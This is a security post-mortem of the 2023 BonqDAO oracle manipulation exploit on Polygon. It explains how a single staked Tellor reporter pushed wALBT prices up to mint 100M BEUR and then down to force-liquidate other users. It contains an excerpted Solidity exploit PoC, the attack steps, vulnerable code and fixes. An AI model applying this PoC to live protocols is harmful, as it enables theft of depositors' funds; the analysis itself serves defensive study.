# BonqDAO — Tellor Oracle Manipulation Attack Analysis

| Item | Details |
|------|------|
| **Date** | 2023-02-01 |
| **Protocol** | BonqDAO |
| **Chain** | Polygon |
| **Loss** | $120,000,000 (BEUR stablecoin ~$88M + ALBT token ~$32M) |
| **Attacker** | [0xcAcf...f642](https://polygonscan.com/address/0xcAcf2D28B2A5309e099f0C6e8C60Ec3dDf656642) |
| **Attack Contract** | [0xed59...b5f1](https://polygonscan.com/address/0xed596991ac5f1aa1858da66c67f7cfa7e54b5f1) |
| **Attack Tx 1** | [0x3195...1b19](https://polygonscan.com/tx/0x31957ecc43774d19f54d9968e95c69c882468b46860f921668f2c55fadd51b19) |
| **Attack Tx 2** | [0xa02d...32b1](https://polygonscan.com/tx/0xa02d0c3d16d6ee0e0b6a42c3cc91997c2b40c87d777136dedebe8ee0f47f32b1) |
| **Vulnerable Contract** | [TellorFlex 0x8f55...4d5b](https://polygonscan.com/address/0x8f55d884cad66b79e1a131f6bcb0e66f4fd84d5b#code#F2#L282) |
| **Root Cause** | wALBT price manipulation by a single Tellor reporter (no TWAP protection) |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2023-02/BonqDAO_exp.sol) |

---

## 1. Vulnerability Overview

BonqDAO is a CDP (Collateralized Debt Position)-based stablecoin protocol operating on the Polygon chain. Users can deposit wALBT (Wrapped AllianceBlock Token) as collateral and mint BEUR stablecoin.

The protocol uses the **TellorFlex decentralized oracle** to calculate collateral value. TellorFlex allows anyone who stakes a certain amount of TRB (Tellor governance token) to report prices, and reported prices are immediately adopted as the current price.

The core vulnerability arose from the combination of two issues:

1. **TellorFlex's instant price reflection (No Delay/TWAP)**: `getCurrentValue()` returns the new price immediately after a `submitValue()` call. Prices that have not passed the dispute period are immediately considered valid.
2. **Massive profit potential relative to low staking cost**: At the time, staking only ~10 TRB (~$150 worth) enabled manipulation of hundreds of millions of dollars.

The attacker combined these two vulnerabilities to:
- **Tx1**: Artificially inflate the wALBT price to mint 100 million BEUR using only 0.1 wALBT as collateral
- **Tx2**: Crash the wALBT price to near zero to force-liquidate other users' CDPs and seize their ALBT collateral

---

## 2. Vulnerable Code Analysis

### 2.1 TellorFlex Instant Price Reflection (Core Vulnerability)

```solidity
// ❌ Vulnerable TellorFlex submitValue() — reflected immediately as current price
function submitValue(
    bytes32 _queryId,
    bytes memory _value,
    uint256 _nonce,
    bytes memory _queryData
) external {
    // Anyone meeting the staking requirement can submit a price
    StakeInfo storage _staker = stakerDetails[msg.sender];
    require(_staker.stakedBalance >= stakeAmount, "User not sufficiently staked");
    require(
        block.timestamp - _staker.reporterLastTimestamp >= reportingLock,
        "reportingLock period has not elapsed"
    );
    // ❌ Added to reports array immediately upon submission — no dispute period check
    reports[_queryId].timestamps.push(block.timestamp);
    reports[_queryId].valueByTimestamp[block.timestamp] = _value;
    reports[_queryId].reporterByTimestamp[block.timestamp] = msg.sender;
    _staker.reporterLastTimestamp = block.timestamp;
    // ...
}

// ❌ Vulnerable getCurrentValue() — no dispute period verification
function getCurrentValue(bytes32 _queryId) 
    external view returns (bytes memory _value) 
{
    uint256 _count = reports[_queryId].timestamps.length;
    if (_count == 0) return bytes("");
    // Returns the most recently submitted value as-is — manipulated values reflected instantly
    return reports[_queryId].valueByTimestamp[
        reports[_queryId].timestamps[_count - 1]
    ];
}
```

```solidity
// ✅ Fixed code — use getDataBefore() to consume price only after dispute period
function getSafeCurrentValue(bytes32 _queryId) 
    external view returns (bytes memory _value) 
{
    // Only trust data older than 12 hours (dispute window)
    uint256 _disputeWindow = 12 hours;
    (bool _ifRetrieve, bytes memory _safeValue, ) = 
        tellorFlex.getDataBefore(_queryId, block.timestamp - _disputeWindow);
    require(_ifRetrieve, "No safe price data available");
    return _safeValue;
}
```

**Issue**: BonqDAO trusted the instantly reflected price by using `getCurrentValue()`. If an attacker stakes only 10 TRB (~$150) and submits a manipulated price via `submitValue()`, BonqDAO uses that price for collateral valuation in the next block.

### 2.2 BonqDAO Collateral Valuation Logic

```solidity
// ❌ Vulnerable collateralValue() — directly uses manipulated oracle price
function collateralValue() public view returns (uint256) {
    // Directly uses TellorFlex's current price without checking the dispute period
    uint256 currentPrice = getOraclePrice(); // internally calls getCurrentValue()
    uint256 collateralAmount = collateral;   // collateral quantity
    // Manipulated price * collateral amount = astronomically inflated collateral value
    return collateralAmount * currentPrice / DECIMAL_PRECISION;
}

// ❌ borrow() — allows borrowing based on inflated collateral value
function borrow(address _recipient, uint256 _amount, address _newNextTrove) external {
    // MCR check — always passes due to manipulated price
    require(
        collateralValue() * DECIMAL_PRECISION / (debt() + _amount) >= mcr(),
        "Collateral ratio not met"
    );
    // Allows minting 100,000,000 BEUR
    _mint(_recipient, _amount);
}
```

```solidity
// ✅ Fixed borrow() — uses TWAP or price after dispute period
function borrow(address _recipient, uint256 _amount, address _newNextTrove) external {
    // Use a safe price that has passed the dispute period
    uint256 safePrice = priceFeed.getSafePrice(token); // TWAP or getDataBefore()
    uint256 safeCollateralValue = collateral * safePrice / DECIMAL_PRECISION;
    require(
        safeCollateralValue * DECIMAL_PRECISION / (debt() + _amount) >= mcr(),
        "Collateral ratio not met"
    );
    _mint(_recipient, _amount);
}
```

**Issue**: BonqDAO's price feed trusted TellorFlex's instantly reflected value, allowing the manipulated price to pass the collateral ratio check.

---

## 3. Attack Flow

### 3.1 Preparation Phase

- The attacker acquired 20 TRB tokens (approximately $300)
- The attacker acquired approximately 26.7 wALBT tokens (for two price reporter operations + collateral deposit)
- Two PriceReporter contracts were pre-designed

### 3.2 Execution Phase

#### Tx1 — Mass BEUR Minting (Block 38,792,978)

1. **[Deploy PriceReporter]**: Attacker deploys PriceReporter contract
2. **[Stake TRB]**: Transfer 10 TRB to PriceReporter → stake in TellorFlex
3. **[Price Manipulation ↑]**: Call `submitValue()` — set wALBT price to `5e27` (5×10²⁷)
4. **[Create Trove]**: Create a wALBT collateral Trove via BonqProxy
5. **[Deposit Collateral]**: Transfer 0.1 wALBT to Trove and call `increaseCollateral()`
6. **[Mint BEUR]**: Call `borrow()` based on manipulated price → receive 100 million BEUR
7. **[Second Trove]**: Create Trove2 for receiving Tx2 liquidation proceeds and deposit remaining wALBT

#### Tx2 — Force-Liquidate Other Users (Block 38,793,029)

8. **[Deploy PriceReporter]**: Deploy a second PriceReporter contract
9. **[Stake TRB]**: Transfer 10 TRB to PriceReporter → stake in TellorFlex
10. **[Price Manipulation ↓]**: Call `submitValue()` — set wALBT price to `0.0000001 * 1e18`
11. **[Fetch Trove List]**: Collect all wALBT CDP addresses via `firstTrove()`, `nextTrove()` (45 total)
12. **[Force Liquidate]**: Call `liquidate()` on each Trove — collateral ratio fails at crashed price → liquidation executed
13. **[Repay Debt]**: Repay Trove2's debt using BEUR minted in Tx1
14. **[Withdraw Collateral]**: Withdraw all wALBT via `decreaseCollateral()`

### 3.3 Attack Flow Diagram

```
  [Attacker]
     │
     ├─ Preparation: acquire 20 TRB + 26.7 wALBT
     │
     ▼
┌─────────────────────────────────────────────────────┐
│  Tx1: Block 38,792,978                              │
│                                                     │
│  Attacker ──10 TRB──▶ PriceReporter1                │
│                          │                          │
│                          ▼                          │
│                    TellorFlex                       │
│                    submitValue()                    │
│                    wALBT = 5,000,000,000,000,000,   │
│                            000,000,000,000 (5e27)   │
│                          │                          │
│                          ▼ (current price instantly reflected)│
│  Attacker ──0.1 wALBT──▶ BonqDAO Trove1             │
│                          │                          │
│                          │ Collateral value = 0.1 * 5e27│
│                          │ MCR check passes ✓       │
│                          ▼                          │
│  Attacker ◀──100,000,000 BEUR── borrow()            │
└─────────────────────────────────────────────────────┘
     │
     │ ~50 blocks elapsed
     │
     ▼
┌─────────────────────────────────────────────────────┐
│  Tx2: Block 38,793,029                              │
│                                                     │
│  Attacker ──10 TRB──▶ PriceReporter2                │
│                          │                          │
│                          ▼                          │
│                    TellorFlex                       │
│                    submitValue()                    │
│                    wALBT = 0.0000001 (near zero)    │
│                          │                          │
│                          ▼ (current price instantly reflected)│
│  Other user Troves:      Collateral value ≈ 0       │
│  Trove[1..43]            Collateral ratio not met   │
│       │                  MCR check fails            │
│       ▼                                             │
│  liquidate() called ──▶ Liquidation executed        │
│       │                                             │
│       ▼                                             │
│  Attacker Trove2 ◀── Liquidated wALBT received      │
│                                                     │
│  Attacker ──100M BEUR──▶ Trove2.repay()             │
│  Attacker ◀── all wALBT ── decreaseCollateral()     │
└─────────────────────────────────────────────────────┘
     │
     ▼
  [Result]
  Attacker holds: ~100,514,098 BEUR + ~113,813,998 ALBT
  Protocol loss: approximately $120,000,000
```

### 3.4 Outcome

| Item | Amount |
|------|------|
| Stolen BEUR (stablecoin) | 100,514,098.3407 BEUR |
| Stolen ALBT (collateral token) | 113,813,998.3698 ALBT |
| Attack cost (TRB staking) | ~20 TRB (~$300) |
| Total loss | ~$120,000,000 |

---

## 4. PoC Code (Key Logic Excerpt + Comments)

```solidity
// ====================================================
// Tx1: Inflate wALBT price + mass mint BEUR
// ====================================================
function tx1_mintMassiveAmountOfBEUR() public {
    // [Step 1] Deploy a new PriceReporter contract
    // PriceReporter executes in the Exploit contract's context via delegatecall
    PriceReporter Reporter = new PriceReporter();

    // [Step 2] Transfer TellorFlex minimum stake amount (10 TRB) to PriceReporter
    TRB.transfer(address(Reporter), TellorFlex.getStakeAmount()); // ~10 TRB

    // [Step 3] Submit manipulated price: wALBT = 5e27 (5,000,000,000,000,000,000,000,000,000)
    // Key: after submitValue(), getCurrentValue() reflects the new price instantly — no TWAP/delay
    Reporter.updatePrice(10e18, 5e27); // ❌ oracle price manipulation

    // [Step 4] Create a new Trove (CDP) in BonqDAO
    maliciousTrove = BonqProxy.createTrove(address(WALBT));

    // [Step 5] Deposit only 0.1 wALBT as collateral (real value ~$0.1)
    WALBT.transfer(maliciousTrove, 0.1 * 1e18);
    ITrove(maliciousTrove).increaseCollateral(0, address(0));

    // [Step 6] Collateral value at manipulated price = 0.1 * 5e27 → astronomical figure
    // Collateral ratio check passes → 100 million BEUR minted successfully
    ITrove(maliciousTrove).borrow(address(this), 100_000_000e18, address(0)); // ❌ borrow based on manipulated price

    // [Step 7] Prepare a second Trove to receive liquidation proceeds in Tx2
    maliciousTrove2 = BonqProxy.createTrove(address(WALBT));
    WALBT.transfer(maliciousTrove2, WALBT.balanceOf(address(this)));
    ITrove(maliciousTrove2).increaseCollateral(0, address(0));
}

// ====================================================
// Tx2: Crash wALBT price + force-liquidate other users
// ====================================================
function tx2_liquidateMassiveAmountOfALBT() public {
    // [Step 1] Deploy second PriceReporter + stake TRB
    PriceReporter Reporter = new PriceReporter();
    TRB.transfer(address(Reporter), TellorFlex.getStakeAmount());

    // [Step 2] Crash wALBT price to near zero
    // 0.0000001 * 1e18 = 100 (near-zero price)
    Reporter.updatePrice(10e18, 0.0000001 * 1e18); // ❌ oracle price manipulation (opposite direction)

    // [Step 3] Collect all wALBT CDP Trove addresses (traverse linked list)
    address[] memory troves = new address[](45);
    troves[0] = BonqProxy.firstTrove(address(WALBT));
    for (uint256 i = 1; i < troves.length; ++i) {
        troves[i] = BonqProxy.nextTrove(address(WALBT), troves[i - 1]);
    }

    // [Step 4] Call liquidate() on each victim Trove
    // Price crash causes all Troves to fall below MCR → force liquidation
    for (uint256 i = 1; i < troves.length - 1; ++i) {
        address target = troves[i];
        uint256 debt = ITrove(target).debt();
        if (debt == 0) continue;
        ITrove(target).liquidate(); // ❌ force-liquidate legitimate users at manipulated price
    }

    // [Step 5] Repay attacker's second Trove debt using BEUR minted in Tx1
    BEUR.approve(troves[44], type(uint256).max);
    ITrove(troves[44]).repay(type(uint256).max, address(0));

    // [Step 6] Withdraw wALBT accumulated from liquidations to attacker address
    address owner = ITrove(troves[44]).getRoleMember(keccak256("OWNER_ROLE"), 0);
    vm.prank(owner);
    ITrove(troves[44]).decreaseCollateral(
        address(this),
        WALBT.balanceOf(troves[44]),
        address(0)
    );
}

// ====================================================
// Core price manipulation mechanism
// ====================================================
function updatePrice(uint256 _tokenId, uint256 _price) public {
    // ABI-encoded data for generating the wALBT/USD SpotPrice query ID
    bytes memory queryData = hex"00000000..."; // Encoded "SpotPrice", "albt", "usd"
    bytes32 queryId = keccak256(queryData);
    bytes memory price = abi.encodePacked(_price); // Encode manipulated price as bytes

    TRB.approve(address(TellorFlex), type(uint256).max);
    TellorFlex.depositStake(_tokenId); // Stake TRB (~10 TRB)

    // ❌ Core vulnerable call: price submission reflected instantly as current price
    TellorFlex.submitValue(queryId, price, 0, queryData);
}
```

---

## 5. Vulnerability Classification

| ID | Vulnerability | Severity | CWE | Pattern Category |
|----|--------|--------|-----|--------------|
| V-01 | Tellor oracle instant price reflection (No TWAP) | CRITICAL | CWE-1038 | 04_oracle_manipulation |
| V-02 | Excessive influence relative to low staking cost | CRITICAL | CWE-400 | 04_oracle_manipulation |
| V-03 | Single reporter dependency (decentralized oracle single point of failure) | HIGH | CWE-829 | 04_oracle_manipulation |
| V-04 | Liquidation logic directly dependent on oracle price | HIGH | CWE-1038 | 18_liquidation |

### V-01: Tellor Oracle Instant Price Reflection (No TWAP)

- **Description**: BonqDAO used TellorFlex's `getCurrentValue()` to immediately apply the latest reported value — without waiting for the dispute period to elapse — in collateral value calculations. The correct approach is to use `getDataBefore(queryId, block.timestamp - disputeWindow)` to consume only validated historical prices.
- **Impact**: The attacker was able to mint 100 million BEUR using a manipulated price applied immediately upon submission, and force-liquidate other users' CDPs.
- **Attack Conditions**: Possession of the minimum TRB stake amount (approximately $150 worth at the time); ability to execute price submission + borrow within a single block.

### V-02: Excessive Influence Relative to Low Staking Cost

- **Description**: TellorFlex's minimum stake amount (`stakeAmount`) was extremely low relative to the scale of liquidity in the protocol. The attacker executed a $120M attack using approximately $300 worth of TRB.
- **Impact**: Due to economic irrationality, the expected profit from oracle manipulation overwhelmingly exceeded the cost.
- **Attack Conditions**: Possession of TRB above the minimum stake amount; a point in time when the TRB price is low relative to the manipulation profit.

### V-03: Single Reporter Dependency (Decentralized Oracle Single Point of Failure)

- **Description**: TellorFlex allows a single reporter to submit a price with no consensus (majority) mechanism. It was not designed to use the median value from multiple independent reporters.
- **Impact**: A single malicious actor was able to control the entire price feed.
- **Attack Conditions**: Meeting TellorFlex staking requirements.

### V-04: Liquidation Logic Directly Dependent on Oracle Price

- **Description**: BonqDAO's `liquidate()` function also directly used the current oracle price to determine liquidation eligibility. Due to price manipulation, users maintaining a healthy collateral ratio were instantaneously made eligible for liquidation.
- **Impact**: 44 victim Troves were force-liquidated, with a total of 113,813,998 ALBT seized.
- **Attack Conditions**: Successful price crash through exploitation of V-01/V-02/V-03 vulnerabilities.

---

## 6. Remediation Recommendations

### Immediate Actions

```solidity
// ✅ Fix 1: Use getDataBefore() instead of getCurrentValue() for dispute-period-elapsed price
contract BonqPriceFeed {
    ITellorFlex public immutable tellorFlex;
    bytes32 public immutable queryId; // wALBT/USD query ID
    uint256 public constant DISPUTE_WINDOW = 12 hours; // Tellor dispute period

    function getPrice() external view returns (uint256) {
        // ✅ Retrieve a safe price that has passed the dispute window
        (bool _ifRetrieve, bytes memory _value, uint256 _timestamp) = 
            tellorFlex.getDataBefore(queryId, block.timestamp - DISPUTE_WINDOW);
        
        require(_ifRetrieve, "No validated price data available");
        // Prices that are too old are also dangerous (e.g., older than 24 hours)
        require(block.timestamp - _timestamp <= 24 hours, "Price data too stale");
        
        return abi.decode(_value, (uint256));
    }
}
```

```solidity
// ✅ Fix 2: Use TWAP-based price oracle (Uniswap V3 example)
contract TWAPPriceFeed {
    IUniswapV3Pool public pool;
    uint32 public constant TWAP_PERIOD = 1800; // 30-minute TWAP

    function getPrice() external view returns (uint256) {
        uint32[] memory secondsAgos = new uint32[](2);
        secondsAgos[0] = TWAP_PERIOD;
        secondsAgos[1] = 0;

        (int56[] memory tickCumulatives, ) = pool.observe(secondsAgos);
        int56 tickCumulativesDelta = tickCumulatives[1] - tickCumulatives[0];
        int24 arithmeticMeanTick = int24(tickCumulativesDelta / int56(uint56(TWAP_PERIOD)));

        // Convert tick → price
        return OracleLibrary.getQuoteAtTick(arithmeticMeanTick, 1e18, token0, token1);
    }
}
```

### Structural Improvements

| Vulnerability | Recommended Action |
|--------|-----------|
| V-01: Instant price reflection | Use `getDataBefore(queryId, block.timestamp - 12 hours)`; dual-verify with a Chainlink secondary oracle |
| V-02: Low staking cost | Dynamically adjust minimum stake relative to protocol TVL; introduce price deviation Circuit Breaker |
| V-03: Single reporter | Use median from at least 3 independent reporters; prohibit trusting single-submitter prices |
| V-04: Liquidation oracle dependency | Add price validity checks before liquidation; pause liquidations on sharp short-term price swings |

---

## 7. Lessons Learned

1. **"Delayed trust" is the essence of oracle design**: When using decentralized oracles (especially Tellor), only trust prices that have passed the dispute period. Use `getDataBefore(queryId, block.timestamp - disputeWindow)` instead of `getCurrentValue()`.

2. **Balance oracle manipulation cost vs. protocol TVL**: The minimum cost required to report oracle prices must be proportional to the scale of liquidity in the protocol. When manipulation cost ($300) << manipulation profit ($120M), economic security breaks down.

3. **Single oracle dependency is a single point of failure**: CDP/lending protocols should use at least two independent oracle sources (e.g., Chainlink + Tellor), and revert transactions when the deviation between the two exceeds a threshold.

4. **The necessity of Circuit Breakers**: A mechanism is needed to automatically pause collateral/borrowing functions when a price moves abnormally in a single block (e.g., rises or falls by more than 10×).

5. **Apply the same oracle security standards to liquidation logic**: Not only minting functions but also liquidation functions must be protected from manipulated oracles. In particular, structures that allow large-scale batch liquidations become a secondary profit vector for price manipulation attacks.

6. **Similar cases**: Mango Markets (2022-10, Solana, $116M) — identical oracle manipulation pattern. The attacker pumped the MNGO token price to borrow, then crashed the price leaving loans unpaid. BonqDAO has a Tellor-specific vulnerability, but the root cause (immediately trusting a single price source) is the same.

---

## 8. On-Chain Verification

### 8.1 Attack Transaction Information

| Item | Tx1 | Tx2 |
|------|-----|-----|
| Transaction Hash | `0x31957ecc...51b19` | `0xa02d0c3d...32b1` |
| Block Number | 38,792,978 | 38,793,029 |
| Block Difference | — | +51 blocks (~2 minutes) |
| Malicious PriceReporter | `0xbaf4...fe8a` | `0xb5c0...ede5` |

### 8.2 PoC vs. On-Chain Data Comparison

| Item | PoC Value | On-Chain Actual | Notes |
|------|-----------|-------------|------|
| Attack collateral (wALBT) | 0.1 wALBT | 0.1 wALBT | Matches |
| BEUR minted | 100,000,000 | 100,514,098.34 | Includes fees |
| ALBT seized | — | 113,813,998.37 | Tx2 liquidation proceeds |
| TRB staked | 10 TRB × 2 | 10 TRB × 2 | Matches |
| Manipulated price (up) | 5 × 10²⁷ | 5 × 10²⁷ | Matches |
| Manipulated price (down) | 1 × 10¹¹ | 1 × 10¹¹ | Matches |

### 8.3 Related Analysis Reports

| Source | Link |
|------|------|
| BlockSec Analysis | https://twitter.com/BlockSecTeam/status/1621043757390123008 |
| PeckShield | https://twitter.com/peckshield/status/1620926816868499458 |
| CertiK | https://twitter.com/CertiKAlert/status/1621008399772024833 |
| SlowMist | https://twitter.com/SlowMist_Team/status/1621087651158966274 |
| Omniscia Post-Mortem | https://medium.com/@omniscia.io/bonq-protocol-incident-post-mortem-4fd79fe5c932 |
| Forta Alert | https://explorer.forta.network/alert/0x6338aaa7df91e7136c9f494dfea2c5309dae7c1575815f015f1e9e94be6759d5 |